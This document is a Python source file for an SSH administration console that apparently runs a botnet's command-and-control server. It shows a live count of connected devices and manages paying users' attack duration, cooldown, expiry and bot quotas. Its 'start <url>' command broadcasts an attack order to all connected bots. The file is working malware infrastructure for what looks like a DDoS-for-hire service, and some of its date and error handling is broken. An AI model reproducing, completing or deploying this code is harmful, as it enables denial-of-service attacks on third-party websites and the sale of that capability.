import time
import threading
import random

import broadcast
import database

from datetime import datetime, date

UP_KEY = '\x1b[A'.encode()
DOWN_KEY = '\x1b[B'.encode()
RIGHT_KEY = '\x1b[C'.encode()
LEFT_KEY = '\x1b[D'.encode()
BACK_KEY = '\x7f'.encode()

def live_title(channel, username):
    while 1:
        try:
            channel.send(f'\33]0;[ {len(broadcast.addr_clients)} ] Devices | {username}\a')
            time.sleep(0.2)
        except:
            channel.close()

def main_cmds(channel, username, addr):
    spining_thing = ['-', '\\', '|', '/']
    cscreen = "\033[2J\033[H" 
    channel.send(cscreen)

    for i in range(10):
        channel.send(f"\rLoading Terminal {spining_thing[i % len(spining_thing)]} ")
        time.sleep(0.3)
    channel.send(cscreen)
    
    run = True
    threading.Thread(target=live_title, args=(channel, username,)).start()
    while run:
        bashrc = f"\033[32;1m{username}@localhost# \033[0m"
        channel.send(bashrc)
        command = ""
        while not command.endswith("\r"):
            transport = channel.recv(1024).decode("utf-8")
            if transport == "\r": 
                channel.send("\r\n")
                break
            elif transport == "\x7f":
                if len(command) > 0:
                    command = command[:-1] 
                    channel.send("\b \b")  

            elif transport == "\x1b[A" or transport == "\x1b[B":
                pass
            else:
                command += transport
                channel.send(transport)

        command = command.strip().lower()

        # begin admin cli
        if command == 'help':
            channel.send("User Management...\r\n")
            channel.send("adduser   | Create new user account\r\n")
            channel.send("deluser   | Delete user account\r\n")
            channel.send("listusers | List of all users\r\n")
            channel.send("chpasswd  | Change password for a specific user\r\n")
            channel.send("getuser   | Retrieve infomation about a specific user\r\n")


        elif command.startswith('adduser'):
            parts = command.split()
            if len(parts) < 2:
                channel.send("Error: Missing username for 'adduser' command\r\n")
            else:
                new_user = parts[1]
                if new_user in database.clients_list:
                    channel.send(f"User {new_user} already exists\r\n")
                else:
                    channel.send(f"Adding new user: {new_user}\r\n")
                    channel.send("Enter new password: ")

                    password = ""
                    mask_passwd = ""

                    while True:
                        transport = channel.recv(1024).decode()
                        if transport == "\r":
                            if not password:
                                channel.send("\rPassword cannot be empty. Enter password: ")
                                continue
                            channel.send("\r\n")
                            break
                        elif transport == "\x7f":
                            if len(password) > 0:
                                password = password[:-1]
                                mask_passwd = mask_passwd[:-1]
                                channel.send("\b \b")
                        else:
                            password += transport
                            mask_passwd += "*"
                            channel.send("*")

                    role_id = None

                    while role_id is None:
                        channel.send("Enter the user type (0 for admin, 1 for user): ")
                        transport = ""
                        while True:
                            char = channel.recv(1024).decode()
                            if char == "\r":  
                                break
                            elif char == "\x7f":
                                if len(transport) > 0:
                                    transport = transport[:-1]
                                    channel.send("\b \b")
                            else:
                                transport += char
                                channel.send(char)
                        try:
                            role_id = int(transport)
                            if role_id not in [0, 1]:
                                channel.send("\rInvalid role ID. ")
                                role_id = None
                        except ValueError:
                            channel.send("\rInvalid input. ")

                
                    user_id = random.randint(10, 340000)

                    duration_limit = None
                    while duration_limit is None:
                        channel.send("\r\n")
                        channel.send("Attack duration (press enter for none): ")
                        transport = ""
                        while True:
                            char = channel.recv(1024).decode()
                            if char == "\r":  
                                break
                            elif char == "\x7f":
                                if len(transport) > 0:
                                    transport = transport[:-1]
                                    channel.send("\b \b")
                            else:
                                transport += char
                                channel.send(char)

                        if transport.strip() == "":
                            channel.send("\r\nNo duration limit set")
                            duration_limit = 0
                            break

                        try:
                            duration_limit = int(transport)
                            if duration_limit < 0:
                                channel.send("Invalid duration. ")
                                duration_limit = None 
                        except ValueError:
                            channel.send("\rInvalid input. ")
                    
                    cooldown_limit = None
                    while cooldown_limit is None:
                        channel.send("\r\n")
                        channel.send("Cooldown (press enter for none): ")
                        transport = ""
                        while True:
                            char = channel.recv(1024).decode()
                            if char == "\r":  
                                break
                            elif char == "\x7f":
                                if len(transport) > 0:
                                    transport = transport[:-1]
                                    channel.send("\b \b")
                            else:
                                transport += char
                                channel.send(char)

                        if transport.strip() == "":
                            channel.send("\r\nNo cooldown limit set")
                            cooldown_limit = 0
                            break

                        try:
                            cooldown_limit = int(transport)
                            if cooldown_limit < 0:
                                channel.send("Invalid cooldown. ")
                                cooldown_limit = None 
                        except ValueError:
                            channel.send("\rInvalid input. ")

                    expiry_date = None
                    while expiry_date is None:
                        channel.send("\r\nExpiry date (YYYY-MM-DD): ")
                        transport = ""
                        while True:
                            char = channel.recv(1024).decode()
                            if char == "\r":  
                                break
                            elif char == "\x7f":
                                if len(transport) > 0:
                                    transport = transport[:-1]
                                    channel.send("\b \b")
                            else:
                                transport += char
                                channel.send(char)

                        if transport.strip() == "":
                            channel.send("\r\nNo expiry date set")
                            expiry_date = date(2040, 6, 18)
                            break

                        try:
                            parsed_date = datetime.datetime.strptime(transport, "%Y-%m-%d")
                            expiry_date = parsed_date.date()
                            print(expiry_date)
                        except ValueError:
                            channel.send("Invalid date forma\r\n")
                    
                    bot_access = None
                    while bot_access is None:
                        channel.send("\r\n")
                        channel.send("Client count (enter -1 for all clients): ")
                        transport = ""
                        while True:
                            char = channel.recv(1024).decode()
                            if char == "\r":  
                                break
                            elif char == "\x7f":
                                if len(transport) > 0:
                                    transport = transport[:-1]
                                    channel.send("\b \b")
                            else:
                                transport += char
                                channel.send(char)

                        if transport.strip() == "":
                            channel.send("\r\nNo client access limit set. All clients will be included.\r\n")
                            bot_access = -1
                            break

                        try:
                            bot_access = int(transport)
                            if bot_access == 0:
                                channel.send("\r\nNo clients allowed for this user\r\n")
                                break
                            elif bot_access == -1:
                                channel.send("\r\nAll clients will be allowed access\r\n")
                                break
                            elif bot_access < 0:
                                channel.send("\rInvalid input")
                                bot_access = None
                            else:
                                channel.send(f"\r\nAccess limit set to {bot_access} clients\r\n")
                                break 
                        except ValueError:
                            channel.send("\rInvalid input. ")

                    # api key must be set manually in the MySQL db
                    try:
                         mkuser = database.add_user(new_user, password, str(role_id), str(user_id), str(duration_limit), str(cooldown_limit), expiry_date, str(bot_access), api_key='')
                         channel.send(mkuser + "\r\n")
                    except Exception as e:
                        channel.send(e + "\r\n")
    
        elif command.startswith("deluser"):
            parts = command.split()
            if len(parts) < 2:
                channel.send("Error: Missing user for 'deluser' command\r\n")
            
            elif parts[1] not in database.clients_list:
                channel.send(f"User {parts[1]} not found\r\n")
            elif parts[1] == database.DATABASE_USER:
                channel.send(f"The root account cannot be deleted\r\n")
            elif parts[1] == username: # self
                channel.send("You cannot delete your own account\r\n")
            else:
                database.del_user(parts[1])
                channel.send(f"User {parts[1]} has been deleted.\r\n")

        elif command == 'listusers':
            users = database.clients_list.items()
            for usernames, user in users:
                rid = user.get('role_id', None)
                uid = user.get('user_id', None)
                atk = user.get('duration', None)
                cdt = user.get('cooldown',None)
                end = user.get('endtime', None)
                bot = user.get('clients', None)
                #api = user.get('api_key', None)
                channel.send(f"Username: {usernames}, Role ID: {rid}, UID: {uid}, ATK: {atk}, Cooldown: {cdt}, Expriy: {end}, Clients: {bot}\r\n")

        elif command.startswith("start"):
            url = command.split()
            if len(url) < 2:
                channel.send("Error: Missing URL for 'start' command \r\n")
            else:
                broadcast.message(f"start {url[1]}")                              
        elif command == 'clear' or command == 'cls':
            channel.send(cscreen)

        elif command == 'exit':
            run = False
        else:
            channel.send("\r")
            
    if 'root' not in username:
        print(f"[SSH] Admin {username} logged out {addr[0]}")
    channel.close()